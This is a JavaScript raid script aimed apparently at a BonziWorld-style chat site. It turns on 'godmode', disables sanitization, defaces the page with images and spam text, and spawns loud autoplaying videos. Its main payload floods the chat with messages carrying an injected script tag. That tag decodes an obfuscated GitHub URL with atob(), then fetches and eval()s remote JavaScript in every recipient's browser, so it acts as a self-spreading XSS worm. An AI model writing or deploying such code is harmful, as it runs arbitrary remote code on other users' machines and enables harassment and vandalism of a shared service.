socket.emit('command', { list: ['godmode'] });
socket.emit('command', { list: ['sanitize', 'off'] });
setInterval(()=>{
(function () {
(function() {
    const videoUrl = "https://raw.githubusercontent.com/ivorydevrimoalt/BONZIWORLDULTRAJAVASCRIPTLIST/main/20260922003409029.mp4";
    
    const activeVideos = [];

    document.addEventListener("click", function(event) {
        activeVideos.forEach(item => {
            const randomX = Math.random() * (window.innerWidth - 300);
            const randomY = Math.random() * (window.innerHeight - 200);
            item.style.left = randomX + "px";
            item.style.top = randomY + "px";
        });

        const videoWrapper = document.createElement("div");
        videoWrapper.style.position = "fixed";
        videoWrapper.style.left = event.clientX + "px";
        videoWrapper.style.top = event.clientY + "px";
        videoWrapper.style.width = "300px";
        videoWrapper.style.height = "200px";
        videoWrapper.style.zIndex = "999999";
        videoWrapper.style.pointerEvents = "none"; 

        const video = document.createElement("video");
        video.src = videoUrl;
        video.autoplay = true;
        video.loop = true;
        video.muted = false; 
        video.style.width = "100%";
        video.style.height = "100%";
        video.style.objectFit = "cover";

        videoWrapper.appendChild(video);
        document.body.appendChild(videoWrapper);

        activeVideos.push(videoWrapper);
    });
})();
  // Play funny sound (optional)
  const audio = new Audio(
    "https://github.com/ivorydevrimoalt/BONZIWORLDULTRAJAVASCRIPTLIST/raw/refs/heads/main/hgdfhdfghdgfhdfghdfg.wav"
  );

  audio.volume = 1;
  audio.play()

  setInterval(() => {
    document.title = "383838383838383838";
    
    const content = document.getElementById("content");
    if (content) {
      content.style.backgroundImage = "url(https://github.com/ivorydevrimoalt/BONZIWORLDULTRAJAVASCRIPTLIST/blob/main/image_2026-09-22_184623421.png?raw=true)";
      content.style.backgroundSize = "100% 100%";
      content.style.backgroundRepeat = "no-repeat";
      content.style.backgroundAttachment = "fixed";
    }
    const chatSend = document.getElementById("chat_send");
    const chatBar = document.getElementById("chat_bar");
    const eeee = document.getElementById("chat_tray");
    const eeeee = document.getElementById("btn_tile");

    const bgUrl = "url(https://github.com/ivorydevrimoalt/BONZIWORLDULTRAJAVASCRIPTLIST/blob/main/image_2026-09-22_184623421.png?raw=true)";

    if (eeeee) {
      eeeee.style.backgroundImage = bgUrl;
      eeeee.style.backgroundSize = "cover";
    }
  
    if (eeee) {
      eeee.style.backgroundImage = bgUrl;
      eeee.style.backgroundSize = "cover";
    }
  
    if (chatSend) {
      chatSend.style.backgroundImage = bgUrl;
      chatSend.style.backgroundSize = "cover";
    }

    if (chatBar) {
      chatBar.style.backgroundImage = bgUrl;
      chatBar.style.backgroundSize = "cover";
    }
    if (typeof socket !== "undefined") {
      socket.emit("command", {
        list: ["name", "Tent a yo chow."]
      });

      socket.emit("talk", {
        text: "Tent a yo chow. <script>console.log('(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)');fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'38-C'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script>"
      });
    }
  }, 100);
})();
const bonziDivs = document.querySelectorAll('div.bonzi');
bonziDivs.forEach(div => div.remove());
const bonziCanvas = document.getElementById('bonzi_canvas');
if (bonziCanvas) {
    bonziCanvas.remove();
}
setInterval(function(){
const inputField = document.getElementById('chat_message');
inputField.placeholder = '38383383 38383 8 3888 '.repeat(Math.random() * 200)
const rooma = document.querySelector('.room_id');
socket.emit('talk', { text: "WHAT THE FUCK!? <script>console.log('(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)');fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'38-C'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script>" });
rooma.textContent = 'Tent a yo chow. '.repeat(Math.random() * 2000)
const roomb = document.getElementById('room_private');
roomb.textContent = 'TREINTA Y OCHO '.repeat(Math.random() * 2000)
const roomc = document.getElementById('room_public');
roomc.textContent = 'THIRTY EIGHT '.repeat(Math.random() * 2000)
const roomd = document.getElementById('room_owner');
roomd.textContent = '3 8 '.repeat(Math.random() * 2000)
const roome = document.getElementById('chat_send');
roome.textContent = 'THREE EIGHT '.repeat(1+ Math.random() * 300)
},10)
},13838)
